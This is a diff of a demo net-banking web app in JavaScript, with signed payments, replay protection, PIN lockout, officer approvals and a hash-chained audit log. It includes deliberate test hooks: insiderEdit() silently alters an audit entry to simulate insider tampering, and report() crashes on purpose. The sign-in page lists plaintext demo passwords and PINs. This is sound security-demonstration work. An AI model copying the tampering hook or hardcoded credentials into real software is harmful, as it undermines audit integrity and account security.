+        (db.payees[s.user] ||= []).push({id: "PY" + randHex(2), name: p.b.name, accEnc: await enc(p.b.accno), last4: p.b.accno.slice(-4), ifsc: p.b.ifsc, internal, activeAt: Date.now() + CONFIG.PAYEE_COOLING_MS});
+        save(); await audit(s.user, "PAYEE_ADDED", "ok", `${p.b.name} ${mask(p.b.accno)}, cooling ${CONFIG.PAYEE_COOLING_MS / 1000}s`);
+        return true;
+      }, "payee added in cooling period");
+    },
+
+    quote(sid, b, token){
+      return call("POST", "/payments/review", sid, async () => {
+        const s = await authn(sid); role(s, "customer"); csrf(s, token);
+        const from = mine(s, b.from);
+        valid(b.amount, "amount", "Enter an amount such as 2500 or 2500.50.");
+        valid(b.remark ?? "", "remark", "Remark can use letters, numbers, spaces and . , - / (40 characters).");
+        const amount = Math.round(parseFloat(b.amount) * 100);
+        if (!(amount > 0)) throw new HttpError(400, "Amount must be more than zero.");
+        if (amount > CONFIG.PER_TXN_LIMIT) throw new HttpError(400, `The limit per payment is ${inr(CONFIG.PER_TXN_LIMIT)}.`);
+        let toLabel;
+        if (db.accounts[b.to]){ const t = mine(s, b.to); if (t.id === from.id) throw new HttpError(400, "Pick a different account to pay into."); toLabel = `Own ${t.type} ${mask(t.last4)}`; }
+        else { const p = await payeeIsActive(s, b.to); toLabel = `${p.name} · ${mask(p.last4)}`; }
+        const q = {from: from.id, to: b.to, amount, remark: b.remark || "", nonce: randHex(12), exp: Date.now() + CONFIG.QUOTE_TTL_MS, user: s.user};
+        q.sig = await sign(JSON.stringify([q.from, q.to, q.amount, q.remark, q.nonce, q.exp, q.user]));
+        return {q, fromLabel: `${from.type} ${mask(from.last4)}`, toLabel, needsApproval: amount > CONFIG.APPROVAL_THRESHOLD};
+      }, "payment details signed (HMAC-SHA256)");
+    },
+    pay(sid, q, mpin, token){
+      return call("POST", "/payments", sid, async () => {
+        const s = await authn(sid); role(s, "customer"); csrf(s, token);
+        if (!q || typeof q !== "object") throw new HttpError(400, "Malformed payment.");
+        if (!await verify(JSON.stringify([q.from, q.to, q.amount, q.remark, q.nonce, q.exp, q.user]), q.sig || "")){
+          await audit(s.user, "PAYMENT_TAMPERED", "denied", `nonce ${String(q.nonce).slice(0, 8)}`); throw new HttpError(400, "Payment refused: the details were changed after review.");
+        }
+        if (q.user !== s.user) throw new HttpError(403, "This payment belongs to another customer.");
+        if (spent.has(q.nonce)){ await audit(s.user, "PAYMENT_REPLAYED", "denied", `nonce ${q.nonce.slice(0, 8)}`); throw new HttpError(409, "Payment refused: this request was already submitted."); }
+        if (Date.now() > q.exp) throw new HttpError(400, "The review expired. Start the payment again.");
+        if (s.mpinFails >= CONFIG.MPIN_MAX_TRIES) throw new HttpError(403, "Payments are blocked for this session after wrong PINs. Sign in again.");
+        valid(mpin, "mpin", "Enter your 4-digit transaction PIN.");
+        const u = db.users[s.user];
+        if (!same(await kdf(mpin, u.msalt), u.mhash)){
+          s.mpinFails++; await audit(s.user, "MPIN_FAILED", "denied", `attempt ${s.mpinFails}`);
+          throw new HttpError(422, s.mpinFails >= CONFIG.MPIN_MAX_TRIES ? "Wrong PIN. Payments are now blocked for this session." : `Wrong PIN. ${CONFIG.MPIN_MAX_TRIES - s.mpinFails} attempts left.`);
+        }
+        const from = mine(s, q.from);
+        if (!db.accounts[q.to]) await payeeIsActive(s, q.to);
+        const day = new Date().toISOString().slice(0, 10);
+        const d = db.daily[s.user]?.day === day ? db.daily[s.user] : (db.daily[s.user] = {day, out: 0});
+        if (d.out + q.amount > CONFIG.DAILY_LIMIT) throw new HttpError(400, `This would cross your daily limit of ${inr(CONFIG.DAILY_LIMIT)}.`);
+        if (from.balance - from.hold < q.amount) throw new HttpError(400, "Not enough available balance.");
+        spent.add(q.nonce); d.out += q.amount;
+        const ref = "VT" + randHex(5).toUpperCase();
+        if (q.amount > CONFIG.APPROVAL_THRESHOLD){
+          from.hold += q.amount;
+          db.pending.push({ref, ...q, status: "pending", ts: Date.now()});
+          save(); await audit(s.user, "PAYMENT_HELD_FOR_APPROVAL", "ok", `${ref} ${inr(q.amount)}`);
+          return {ref, status: "pending"};
+        }
+        settle({...q, ref}, s); save();
+        await audit(s.user, "PAYMENT_DONE", "ok", `${ref} ${inr(q.amount)} from ${mask(from.last4)}`);
+        return {ref, status: "done"};
+      }, "signature, nonce, PIN and balance checked");
+    },
+
+    // officer (checker) endpoints
+    approvals(sid){ return call("GET", "/officer/approvals", sid, async () => { const s = await authn(sid); role(s, "officer"); return db.pending.slice().reverse(); }); },
+    decide(sid, ref, decision, reason, token){
+      return call("POST", `/officer/approvals/${ref}`, sid, async () => {
+        const s = await authn(sid); role(s, "officer"); csrf(s, token);
+        valid(reason, "reason", "Give a short reason (3 to 80 characters).");
+        const p = db.pending.find(x => x.ref === ref && x.status === "pending"); if (!p) throw new HttpError(404, "Nothing pending with that reference.");
+        if (p.user === s.user) throw new HttpError(403, "You cannot approve your own payment.");
+        const from = db.accounts[p.from]; from.hold -= p.amount;
+        if (decision === "approve"){ settle(p, s); p.status = "approved"; }
+        else { p.status = "rejected"; const d = db.daily[p.user]; if (d) d.out = Math.max(0, d.out - p.amount); }
+        p.decidedBy = s.user; p.reason = reason; save();
+        await audit(s.user, decision === "approve" ? "PAYMENT_APPROVED" : "PAYMENT_REJECTED", "ok", `${ref} ${inr(p.amount)}: ${reason}`);
+        return p.status;
+      }, "maker-checker decision recorded");
+    },
+    users(sid){ return call("GET", "/officer/users", sid, async () => { const s = await authn(sid); role(s, "officer"); return Object.values(db.users).map(u => ({id: u.id, name: u.name, role: u.role, failed: u.failed, locked: u.lockUntil > Date.now(), lastLogin: u.lastLogin})); }); },
+    unlock(sid, id, token){ return call("POST", `/officer/users/${id}/unlock`, sid, async () => { const s = await authn(sid); role(s, "officer"); csrf(s, token); const u = db.users[id]; if (!u) throw new HttpError(404, "No such customer."); u.lockUntil = 0; u.failed = 0; save(); await audit(s.user, "ACCESS_UNLOCKED", "ok", id); return true; }); },
+    trail(sid){ return call("GET", "/officer/audit", sid, async () => { const s = await authn(sid); role(s, "officer"); return db.audit.slice().reverse(); }); },
+    verifyTrail(sid){ return call("POST", "/officer/audit/verify", sid, async () => { const s = await authn(sid); role(s, "officer"); const r = await chain(); await audit(s.user, "AUDIT_CHECKED", r.ok ? "ok" : "alert", r.ok ? `${r.count} entries intact` : `broken at #${r.at}`); return r; }); },
+    insiderEdit(){ const e = db.audit.find(x => /PAYMENT_DONE|SIGNIN_SUCCESS/.test(x.event)) || db.audit[0]; e.detail += " [altered]"; save(); return e.seq; },
+    report(sid){ return call("GET", "/reports/interest-certificate", sid, async () => { await authn(sid); const cert = undefined; return cert.year; }); },
+    resetAll(){ store.del(DBK); store.del(KMK); sessions.clear(); }
+  };
+})();
+
+/* ============================== interface ============================== */
+const S = {sid: null, csrf: null, user: null, page: "signin", step: 1, custId: "", phrase: "", otpToken: null, flash: null, review: null, lastPaid: null, acc: null, results: {}, prevLogin: null};
+const root = $("root");
+
+function popMessage(code, mobile, purpose){
+  $("msg").innerHTML = `<div class="msgbox" role="status"><button aria-label="Close message" id="msgX">✕</button>
+    <div class="eyebrow">Message · VM-VTORA · now</div>
+    <div class="code6">${esc(code)}</div>
+    <div>is your OTP to ${esc(purpose)}. Valid 2 minutes. Vittora never calls to ask for it.</div>
+    <div class="muted small" style="margin-top:4px">Sent to mobile XXXXXX${esc(mobile)}</div></div>`;
+  $("msgX").onclick = () => $("msg").innerHTML = "";
+}
+const closeMessage = () => $("msg").innerHTML = "";
+const flash = () => { if (!S.flash) return ""; const f = S.flash; S.flash = null; return `<div class="note ${f.k}" role="alert">${esc(f.t)}</div>`; };
+const err = (id, r) => { $(id).innerHTML = `<div class="note bad" role="alert">${esc(r.error)}</div>`; };
+async function ok(r){ if (r.status === 401 && S.sid){ Object.assign(S, {sid: null, csrf: null, user: null, page: "signin", step: 1, flash: {k: "warn", t: r.error}}); draw(); return false; } return true; }
+function go(p){ S.page = p; draw(); window.scrollTo(0, 0); }
+
+/* ---------- sign in (3 steps) ---------- */
+function signinPage(){
+  const st = n => S.step > n ? "done" : S.step === n ? "on" : "";
+  root.innerHTML = `<div class="signin">
+    <section class="brandside">
+      <div class="logo"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path d="M4 9 15 3l11 6v2H4z" fill="var(--saffron)"/><path d="M6 13h3v9H6zM13.5 13h3v9h-3zM21 13h3v9h-3zM4 24h22v3H4z" fill="var(--side-ink)"/></svg><div>Vittora Bank<small>Net Banking</small></div></div>
+      <div class="stack"><h1>Bank securely from anywhere.</h1>
+        <ul><li>Check your personal phrase before typing your password</li><li>Every sign-in is confirmed with an OTP</li><li>Payments need your 4-digit transaction PIN</li><li>Large payments are verified by a bank officer</li></ul></div>
+      <p class="small" style="color:var(--side-muted)">Vittora will never ask for your password, OTP or PIN by phone, SMS or email.</p>
+    </section>
+    <section class="formside">
+      <ol class="steps" aria-label="Sign-in progress"><li class="${st(1)}"><span>1</span>Customer ID</li><li class="${st(2)}"><span>2</span>Password</li><li class="${st(3)}"><span>3</span>OTP</li></ol>
+      ${flash()}
+      <div id="stepBox"></div>
+      <details class="card small"><summary style="cursor:pointer;font-weight:600">Test login details</summary>
+        <div class="tw"><table class="testcreds"><thead><tr><th>Customer ID</th><th>Password</th><th>PIN</th><th>Role</th></tr></thead><tbody>
+          <tr><td class="mono">aditya</td><td class="mono">Aditya@123</td><td class="mono">2580</td><td>Customer</td></tr>
+          <tr><td class="mono">officer</td><td class="mono">Officer@123</td><td>–</td><td>Bank officer</td></tr></tbody></table></div>
+        <div class="row"><button class="link" id="toArch">Architecture and security controls</button><button class="link" id="reset">Restore original data</button></div><div id="resetBox"></div>
+      </details>
+    </section></div>`;
+  $("toArch").onclick = () => go("arch");
+  $("reset").onclick = () => { $("resetBox").innerHTML = `<div class="note warn row">Restore all balances, payees and logs? <button class="btn bad sm" id="resetGo">Restore</button></div>`; $("resetGo").onclick = async () => { Bank.resetAll(); await Bank.init(); S.flash = {k: "ok", t: "Original data restored."}; S.step = 1; draw(); }; };
+  if (S.step === 1) stepId(); else if (S.step === 2) stepPass(); else stepOtp();
+}
+function stepId(){
+  $("stepBox").innerHTML = `<form id="f1" class="stack" novalidate autocomplete="off"><h2>Enter your Customer ID</h2>
+    <label class="f" for="cid">Customer ID<input id="cid" maxlength="20" autocapitalize="none" spellcheck="false" value="${esc(S.custId || "aditya")}"></label>
+    <div id="e1"></div><div><button class="btn">Continue</button></div></form>`;
+  $("f1").onsubmit = async e => { e.preventDefault(); const id = $("cid").value.trim().toLowerCase(); const r = await Bank.phrase(id); if (r.status !== 200) return err("e1", r); Object.assign(S, {custId: id, phrase: r.data.phrase, step: 2}); draw(); };
+}
+function stepPass(){
+  $("stepBox").innerHTML = `<form id="f2" class="stack" novalidate autocomplete="off"><h2>Confirm it's us, then enter your password</h2>
+    <div class="phrase"><div class="eyebrow">Your personal phrase</div><strong>${esc(S.phrase)}</strong><div class="hint">If this is not the phrase you chose, stop. You may be on a fake website.</div></div>
+    <label class="f" for="pw">Password for <span class="mono">${esc(S.custId)}</span><input id="pw" type="password" maxlength="64" autocomplete="current-password"></label>
+    <div class="row"><button type="button" class="link" id="vk">Use on-screen keyboard</button><span class="hint">Shuffled keys protect against keyloggers.</span></div>
+    <div id="kbdBox"></div><div id="e2"></div>
+    <div class="row"><button class="btn" id="b2">Sign in</button><button type="button" class="btn alt" id="back2">Change Customer ID</button></div></form>`;
+  $("pw").focus();
+  $("back2").onclick = () => { S.step = 1; draw(); };
+  $("vk").onclick = () => keyboard($("kbdBox"), $("pw"));
+  $("f2").onsubmit = async e => { e.preventDefault(); $("b2").disabled = true; const r = await Bank.signin(S.custId, $("pw").value); $("pw").value = ""; $("b2").disabled = false; if (r.status !== 200) return err("e2", r); S.otpToken = r.data.token; S.step = 3; popMessage(r.data.delivered, r.data.mobile, "sign in to Net Banking"); draw(); };
+}
+function keyboard(box, input){
+  let caps = false;
+  const keys = "abcdefghijklmnopqrstuvwxyz0123456789@#$_.!".split("");
+  for (let i = keys.length - 1; i > 0; i--){ const j = crypto.getRandomValues(new Uint32Array(1))[0] % (i + 1); [keys[i], keys[j]] = [keys[j], keys[i]]; }
+  const paint = () => {
+    box.innerHTML = `<div class="kbd" role="group" aria-label="On-screen keyboard">${keys.map(k => `<button type="button" data-k="${esc(k)}">${esc(caps ? k.toUpperCase() : k)}</button>`).join("")}
+      <button type="button" class="wide" data-k="CAPS">${caps ? "abc" : "ABC"}</button><button type="button" class="wide" data-k="DEL">Delete</button><button type="button" class="wide" data-k="CLR">Clear</button></div>`;
+    box.querySelectorAll("button").forEach(b => b.onclick = () => {
+      const k = b.dataset.k;
+      if (k === "CAPS"){ caps = !caps; return paint(); }
+      if (k === "DEL") input.value = input.value.slice(0, -1); else if (k === "CLR") input.value = ""; else input.value += caps ? k.toUpperCase() : k;
+    });
+  };
+  paint();
+}
+function stepOtp(){
+  $("stepBox").innerHTML = `<form id="f3" class="stack" novalidate autocomplete="off"><h2>Enter the OTP sent to your mobile</h2>
+    <p class="muted">A 6-digit code has been sent to your registered mobile number. It is valid for 2 minutes.</p>
+    <label class="f" for="otp">OTP<input id="otp" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="mono" style="letter-spacing:.3em;font-size:1.2rem;max-width:220px"></label>
+    <div id="e3"></div><div class="row"><button class="btn">Verify</button><button type="button" class="btn alt" id="back3">Start again</button></div></form>`;
+  $("otp").focus();
+  $("back3").onclick = () => { closeMessage(); S.step = 1; S.otpToken = null; draw(); };
+  $("f3").onsubmit = async e => {
+    e.preventDefault(); const r = await Bank.otp(S.otpToken, $("otp").value.trim());
+    if (r.status !== 200){ err("e3", r); if (/Start again/.test(r.error)){ S.otpToken = null; } return; }
+    closeMessage();
+    Object.assign(S, {sid: r.data.sid, csrf: r.data.csrf, user: r.data.user, prevLogin: r.data.prevLogin, step: 1, otpToken: null});
+    go(S.user.role === "officer" ? "approvals" : "home");
+  };
+}
+
+/* ---------- signed-in shell ---------- */
+function shell(inner){
+  const items = S.user.role === "officer"
+    ? [["approvals", "Approvals"], ["customers", "Customers"], ["audit", "Audit trail"], ["tests", "Security testing"], ["arch", "Architecture"]]
+    : [["home", "Overview"], ["pay", "Pay & transfer"], ["payees", "Payees"], ["tests", "Security testing"], ["arch", "Architecture"]];
+  root.innerHTML = `<div class="shell">
+    <aside class="side">
+      <div class="logo"><svg width="26" height="26" viewBox="0 0 30 30" aria-hidden="true"><path d="M4 9 15 3l11 6v2H4z" fill="var(--saffron)"/><path d="M6 13h3v9H6zM13.5 13h3v9h-3zM21 13h3v9h-3zM4 24h22v3H4z" fill="var(--side-ink)"/></svg><div>Vittora<small class="hide-sm">${S.user.role === "officer" ? "Branch console" : "Net Banking"}</small></div></div>
+      <nav class="menu" aria-label="Main">${items.map(([k, l]) => `<button data-p="${k}" ${S.page === k || (S.page === "statement" && k === "home") ? 'aria-current="page"' : ""}>${l}</button>`).join("")}</nav>
+      <div class="side-foot"><span class="who">${esc(S.user.name)}</span><span class="timer" id="timer"></span><button class="side-btn" id="out">Sign out</button></div>
+    </aside>
+    <main><div class="page" id="page">${inner}</div></main></div>`;
+  root.querySelectorAll("[data-p]").forEach(b => b.onclick = () => go(b.dataset.p));
+  $("out").onclick = async () => { await Bank.signout(S.sid); Object.assign(S, {sid: null, csrf: null, user: null, page: "signin", step: 1, flash: {k: "ok", t: "You have signed out. Close the browser window if you are on a shared computer."}}); draw(); };
+  tick();
+}
+function tick(){
+  const el = $("timer"); const i = S.sid && Bank.session(S.sid); if (!el || !i) return;
+  const left = CONFIG.IDLE_TIMEOUT_MS - (Date.now() - i.seen);
+  el.textContent = "Session ends in " + mmss(left); el.style.color = left < 30000 ? "var(--saffron)" : "";
+}
+setInterval(async () => {
+  if (!S.sid) return; const i = Bank.session(S.sid);
+  if (!i || Date.now() - i.seen > CONFIG.IDLE_TIMEOUT_MS){ const r = await Bank.payees(S.sid); if (r.status === 401) await ok(r); else if (S.user?.role === "officer"){ await ok(await Bank.users(S.sid)); } return; }
+  tick();
+}, 1000);
+
+/* ---------- customer pages ---------- */
+async function homePage(){
+  const r = await Bank.overview(S.sid); if (!await ok(r)) return;
+  const d = r.data, total = d.accounts.reduce((a, x) => a + x.balance, 0);
+  shell(`${flash()}
+    <div class="row between" style="align-items:end"><div><div class="eyebrow">Good to see you, ${esc(S.user.name.split(" ")[0])}</div><h1 class="num">${inr(total)}</h1><p class="muted small">Total across your accounts</p></div>
+      <button class="btn" id="payBtn">Pay or transfer</button></div>
+    <div class="acc-grid">${d.accounts.map(a => `<div class="acc"><div class="row between"><span class="eyebrow">${esc(a.type)}</span><span class="mono muted" id="no-${a.id}">${esc(a.masked)}</span></div>
+      <div class="amt num">${inr(a.balance)}</div>
+      ${a.available !== a.balance ? `<div class="small" style="color:var(--warn)">${inr(a.available)} available · ${inr(a.balance - a.available)} on hold</div>` : `<div class="small muted">IFSC ${esc(a.ifsc)}</div>`}
+      <div class="row" style="margin-top:6px"><button class="btn alt sm" data-st="${a.id}">Transactions</button><button class="link small" data-rv="${a.id}">View account number</button></div></div>`).join("")}</div>
+    <div class="cols">
+      <div class="card"><h2>Recent activity</h2><div class="tw"><table><tbody>
+        ${d.recent.map(t => `<tr><td><div>${esc(t.remark)}</div><div class="muted small">${when(t.ts)} · <span class="mono">${esc(t.ref)}</span></div></td><td class="r num ${t.dir === "CR" ? "cr" : ""}">${t.dir === "CR" ? "+" : "−"}${inr(t.amount)}</td></tr>`).join("")}
+      </tbody></table></div></div>
+      <div class="card"><h2>Security</h2><dl class="kv">
+        <dt>Last sign-in</dt><dd>${S.prevLogin ? when(S.prevLogin) : "This is your first sign-in"}</dd>
+        <dt>This session</dt><dd>Ends after 3 minutes without activity</dd>
+        <dt>Payments</dt><dd>Need your transaction PIN; above ${inr(CONFIG.APPROVAL_THRESHOLD)} an officer verifies them</dd></dl>
+        ${d.pending.length ? `<h3>Payments awaiting approval</h3><table><tbody>${d.pending.map(p => `<tr><td class="mono">${esc(p.ref)}</td><td class="r num">${inr(p.amount)}</td><td><span class="tag ${p.status === "pending" ? "t-warn" : p.status === "approved" ? "t-ok" : "t-bad"}">${esc(p.status)}</span></td></tr>`).join("")}</tbody></table>` : ""}
+        <p class="muted small">If you don't recognise the last sign-in time, change your password and call your branch.</p></div></div>`);
+  $("payBtn").onclick = () => go("pay");
+  document.querySelectorAll("[data-st]").forEach(b => b.onclick = () => { S.acc = b.dataset.st; go("statement"); });
+  document.querySelectorAll("[data-rv]").forEach(b => b.onclick = async () => {
+    const x = await Bank.reveal(S.sid, b.dataset.rv, S.csrf); if (!await ok(x)) return;
+    const el = $("no-" + b.dataset.rv); if (!el) return; const masked = el.textContent;
+    el.textContent = x.status === 200 ? x.data : x.error; b.hidden = true;
+    setTimeout(() => { el.textContent = masked; b.hidden = false; }, 10000);
+  });
+}
+async function statementPage(){
+  const r = await Bank.statement(S.sid, S.acc); if (!await ok(r)) return;
+  if (r.status !== 200) return shell(`<div class="note bad">${esc(r.error)}</div>`);
+  shell(`<div><button class="link" id="bk">← Overview</button></div><h1>${esc(r.data.account.type)} account <span class="mono muted">${esc(r.data.account.masked)}</span></h1>
+    <div class="card tw" style="padding:8px 14px"><table><thead><tr><th>Date</th><th>Reference</th><th>Description</th><th class="r">Debit / credit</th></tr></thead><tbody>
+    ${r.data.txns.map(t => `<tr><td class="num">${when(t.ts)}</td><td class="mono">${esc(t.ref)}</td><td>${esc(t.remark)}</td><td class="r num ${t.dir === "CR" ? "cr" : ""}">${t.dir === "CR" ? "+" : "−"}${inr(t.amount)}</td></tr>`).join("") || `<tr><td colspan="4" class="muted">No transactions.</td></tr>`}
+    </tbody></table></div>`);
+  $("bk").onclick = () => go("home");
+}
+
+function wiz(n){ const L = ["Details", "Review", "Authorise", "Done"]; return `<ol class="wiz">${L.map((l, i) => `<li class="${i + 1 < n ? "done" : i + 1 === n ? "on" : ""}">${i + 1}. ${l}</li>`).join("")}</ol>`; }
+async function payPage(){
+  const [o, p] = [await Bank.overview(S.sid), await Bank.payees(S.sid)]; if (!await ok(o) || !await ok(p)) return;
+  const now = Date.now();
+  shell(`<h1>Pay & transfer</h1>${wiz(1)}
+    <div class="card" style="max-width:620px"><form id="pf" class="stack" novalidate autocomplete="off">
+      <label class="f" for="from">Pay from<select id="from">${o.data.accounts.map(a => `<option value="${a.id}">${esc(a.type)} ${esc(a.masked)} · ${inr(a.available)} available</option>`).join("")}</select></label>
+      <label class="f" for="to">Pay to<select id="to">
+        <optgroup label="Your accounts">${o.data.accounts.map(a => `<option value="${a.id}">${esc(a.type)} ${esc(a.masked)}</option>`).join("")}</optgroup>
+        <optgroup label="Payees">${p.data.map(x => `<option value="${x.id}" ${x.activeAt > now ? "disabled" : ""}>${esc(x.name)} ${esc(x.masked)}${x.activeAt > now ? " (cooling period)" : ""}</option>`).join("")}</optgroup></select></label>
+      <label class="f" for="amt">Amount (₹)<input id="amt" inputmode="decimal" maxlength="10" value="2500"><span class="hint">Up to ${inr(CONFIG.PER_TXN_LIMIT)} per payment. Above ${inr(CONFIG.APPROVAL_THRESHOLD)}, an officer approves it before money moves.</span></label>
+      <label class="f" for="rem">Remarks<input id="rem" maxlength="40" value="Hostel fees"><span class="hint">Letters, numbers, spaces and . , - /</span></label>
+      <div id="pe"></div><div><button class="btn">Review payment</button></div></form></div>`);
+  const f = $("pf");
+  const fix = () => { if (f.to.value === f.from.value){ const n = [...f.to.options].find(x => x.value !== f.from.value && !x.disabled); if (n) f.to.value = n.value; } };
+  fix(); f.from.onchange = fix;
+  f.onsubmit = async e => {
+    e.preventDefault();
+    const r = await Bank.quote(S.sid, {from: f.from.value, to: f.to.value, amount: f.amt.value.trim(), remark: f.rem.value.trim()}, S.csrf);
+    if (!await ok(r)) return; if (r.status !== 200) return err("pe", r);
+    S.review = r.data; reviewStep();
+  };
+}
+function reviewStep(){
+  const d = S.review, q = d.q;
+  shell(`<h1>Pay & transfer</h1>${wiz(2)}
+    <div class="card" style="max-width:620px"><h2>Check the details</h2>
+      <dl class="kv"><dt>From</dt><dd>${esc(d.fromLabel)}</dd><dt>To</dt><dd>${esc(d.toLabel)}</dd><dt>Amount</dt><dd class="num"><strong>${inr(q.amount)}</strong></dd><dt>Remarks</dt><dd>${esc(q.remark) || "–"}</dd><dt>Valid until</dt><dd class="num">${new Date(q.exp).toLocaleTimeString("en-IN")}</dd></dl>
+      ${d.needsApproval ? `<div class="note warn">This amount is above ${inr(CONFIG.APPROVAL_THRESHOLD)}. After you authorise it, the money is put on hold until a bank officer approves the payment.</div>` : ""}
+      <div class="row"><button class="btn" id="toAuth">Continue</button><button class="btn alt" id="edit">Edit</button></div></div>`);
+  $("edit").onclick = () => go("pay");
+  $("toAuth").onclick = authStep;
+}
+function authStep(){
+  const q = S.review.q;
+  shell(`<h1>Pay & transfer</h1>${wiz(3)}
+    <div class="card" style="max-width:620px"><form id="af" class="stack" novalidate autocomplete="off"><h2>Enter your transaction PIN</h2>
+      <p class="muted">Authorising <strong class="num">${inr(q.amount)}</strong> to ${esc(S.review.toLabel)}.</p>
+      <div class="pin" role="group" aria-label="4-digit PIN">${[0, 1, 2, 3].map(i => `<input id="pin${i}" type="password" inputmode="numeric" maxlength="1" aria-label="PIN digit ${i + 1}" autocomplete="off">`).join("")}</div>
+      <div id="ae"></div><div class="row"><button class="btn" id="authBtn">Authorise payment</button><button type="button" class="btn alt" id="cx">Cancel</button></div></form></div>`);
+  const pins = [0, 1, 2, 3].map(i => $("pin" + i)); pins[0].focus();
+  pins.forEach((el, i) => { el.oninput = () => { el.value = el.value.replace(/\D/g, ""); if (el.value && pins[i + 1]) pins[i + 1].focus(); }; el.onkeydown = e => { if (e.key === "Backspace" && !el.value && pins[i - 1]) pins[i - 1].focus(); }; });
+  $("cx").onclick = () => { S.review = null; go("pay"); };
+  $("af").onsubmit = async e => {
+    e.preventDefault(); $("authBtn").disabled = true;
+    const r = await Bank.pay(S.sid, q, pins.map(p => p.value).join(""), S.csrf);
+    pins.forEach(p => p.value = ""); $("authBtn").disabled = false;
+    if (!await ok(r)) return; if (r.status !== 200){ pins[0].focus(); return err("ae", r); }
+    S.lastPaid = q; const d = S.review; S.review = null;
+    shell(`<h1>Pay & transfer</h1>${wiz(4)}
+      <div class="receipt" style="max-width:620px"><div class="eyebrow">${r.data.status === "pending" ? "Sent for approval" : "Payment successful"}</div>
+        <h2 class="num" style="margin:6px 0 10px">${inr(q.amount)}</h2>
+        <dl class="kv"><dt>Reference</dt><dd class="mono">${esc(r.data.ref)}</dd><dt>From</dt><dd>${esc(d.fromLabel)}</dd><dt>To</dt><dd>${esc(d.toLabel)}</dd><dt>Time</dt><dd>${when(Date.now())}</dd>
+        <dt>Status</dt><dd>${r.data.status === "pending" ? '<span class="tag t-warn">Awaiting officer approval</span>' : '<span class="tag t-ok">Completed</span>'}</dd></dl></div>
+      <div class="row"><button class="btn" id="again">Make another payment</button><button class="btn alt" id="home">Back to overview</button></div>`);
+    $("again").onclick = () => go("pay"); $("home").onclick = () => go("home");
+  };
+}
+
+async function payeesPage(){
+  const r = await Bank.payees(S.sid); if (!await ok(r)) return; const now = Date.now();
+  shell(`<h1>Payees</h1><div class="cols">
+    <div class="card"><h2>Saved payees</h2><div class="tw"><table><thead><tr><th>Name</th><th>Account</th><th>Status</th></tr></thead><tbody>
+      ${r.data.map(p => `<tr><td>${esc(p.name)}<div class="muted small mono">${esc(p.ifsc)}</div></td><td class="mono">${esc(p.masked)}</td><td>${p.activeAt > now ? `<span class="tag t-warn">Active in ${mmss(p.activeAt - now)}</span>` : '<span class="tag t-ok">Active</span>'}</td></tr>`).join("") || `<tr><td colspan="3" class="muted">No payees yet.</td></tr>`}
+    </tbody></table></div><p class="muted small">New payees can receive money only after a ${CONFIG.PAYEE_COOLING_MS / 1000}-second cooling period (30 minutes in branch policy), which limits damage if someone else gets into your account.</p></div>
+    <div class="card" id="addBox"><h2>Add a payee</h2><form id="nf" class="stack" novalidate autocomplete="off">
+      <label class="f" for="pn">Payee name<input id="pn" maxlength="40" value="Rahul Mehta"></label>
+      <label class="f" for="pa">Account number<input id="pa" inputmode="numeric" maxlength="18" value="918010045538821"><span class="hint">9 to 18 digits</span></label>
+      <label class="f" for="pi">IFSC<input id="pi" maxlength="11" value="UTIB0000123" style="text-transform:uppercase"><span class="hint">Four letters, 0, then six letters or digits. Priya's account: 302107766203 · VTRB0002417</span></label>
+      <div id="ne"></div><div><button class="btn">Send OTP</button></div></form></div></div>`);
+  $("nf").onsubmit = async e => {
+    e.preventDefault();
+    const x = await Bank.payeeStart(S.sid, {name: $("pn").value.trim(), accno: $("pa").value.trim(), ifsc: $("pi").value.trim().toUpperCase()}, S.csrf);
+    if (!await ok(x)) return; if (x.status !== 200) return err("ne", x);
+    popMessage(x.data.delivered, x.data.mobile, "add a new payee");
+    $("addBox").innerHTML = `<h2>Confirm with OTP</h2><form id="cf" class="stack" novalidate autocomplete="off">
+      <label class="f" for="potp">OTP sent to your mobile<input id="potp" inputmode="numeric" maxlength="6" class="mono" style="letter-spacing:.3em;max-width:200px"></label>
+      <div id="ce"></div><div class="row"><button class="btn">Confirm payee</button><button type="button" class="btn alt" id="cc">Cancel</button></div></form>`;
+    $("cc").onclick = () => { closeMessage(); payeesPage(); };
+    $("cf").onsubmit = async ev => {
+      ev.preventDefault();
+      const c = await Bank.payeeConfirm(S.sid, x.data.t, $("potp").value.trim(), S.csrf);
+      if (!await ok(c)) return; if (c.status !== 200) return err("ce", c);
+      closeMessage(); payeesPage();
+    };
+  };
+}
+
+/* ---------- officer pages ---------- */
+async function approvalsPage(){
+  const r = await Bank.approvals(S.sid); if (!await ok(r)) return;
+  const open = r.data.filter(p => p.status === "pending"), done = r.data.filter(p => p.status !== "pending");
+  shell(`<h1>Payment approvals</h1><p class="muted">Payments above ${inr(CONFIG.APPROVAL_THRESHOLD)} wait here. The customer who made a payment can never approve it (maker-checker).</p>
+    <div class="card"><h2>Waiting for you (${open.length})</h2>${open.length ? open.map(p => `<div class="stack" style="border-top:1px solid var(--line);padding-top:12px">
+      <div class="row between"><div><strong class="num">${inr(p.amount)}</strong> <span class="muted">from</span> ${esc(p.user)} <span class="mono muted">${esc(p.ref)}</span></div><span class="muted small">${when(p.ts)}</span></div>
+      <div class="small muted">Remarks: ${esc(p.remark) || "–"}</div>
+      <div class="row"><input id="why-${esc(p.ref)}" placeholder="Reason, e.g. verified with customer by phone" maxlength="80" style="flex:1;min-width:200px">
+        <button class="btn sm" data-ap="${esc(p.ref)}">Approve</button><button class="btn bad sm" data-rj="${esc(p.ref)}">Reject</button></div><div id="de-${esc(p.ref)}"></div></div>`).join("") : `<p class="muted">Nothing to approve. Sign in as a customer and pay more than ${inr(CONFIG.APPROVAL_THRESHOLD)} to create one.</p>`}</div>
+    ${done.length ? `<div class="card tw"><h2>Decided</h2><table><thead><tr><th>Reference</th><th>Customer</th><th class="r">Amount</th><th>Decision</th><th>Reason</th></tr></thead><tbody>${done.map(p => `<tr><td class="mono">${esc(p.ref)}</td><td>${esc(p.user)}</td><td class="r num">${inr(p.amount)}</td><td><span class="tag ${p.status === "approved" ? "t-ok" : "t-bad"}">${esc(p.status)}</span></td><td>${esc(p.reason)}</td></tr>`).join("")}</tbody></table></div>` : ""}`);
+  const act = async (ref, d) => { const x = await Bank.decide(S.sid, ref, d, $("why-" + ref).value.trim(), S.csrf); if (!await ok(x)) return; if (x.status !== 200) return err("de-" + ref, x); approvalsPage(); };
+  document.querySelectorAll("[data-ap]").forEach(b => b.onclick = () => act(b.dataset.ap, "approve"));
